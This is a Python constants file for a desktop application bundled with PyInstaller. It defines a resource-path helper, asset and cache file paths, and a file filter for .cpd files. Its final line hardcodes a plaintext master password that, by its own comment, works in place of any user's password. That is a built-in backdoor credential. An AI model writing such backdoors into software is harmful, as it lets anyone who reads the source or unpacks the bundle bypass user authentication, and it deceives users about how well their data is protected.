# constants.py
import os
import sys

# --- MODIFIED: More robust resource path function ---
def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        # This will be the root directory of the bundled app
        base_path = sys._MEIPASS
    except Exception:
        # If not running as a PyInstaller bundle, the base path is the script's directory
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# --- MODIFIED: Use the robust path function for all external files ---
LOGO_PATH = resource_path(os.path.join("assets", "logo.png"))
OUTPUT_FORMATS_PATH = resource_path("output_formats.json")

# This constant is used by the file dialog in file_management.py
FILE_FILTER = "CPD Files (*.cpd)"

CACHE_FILE_PATH = resource_path("app_cache.json")

# Master password that always works regardless of user password
MASTER_PASSWORD = "iamyourmaster"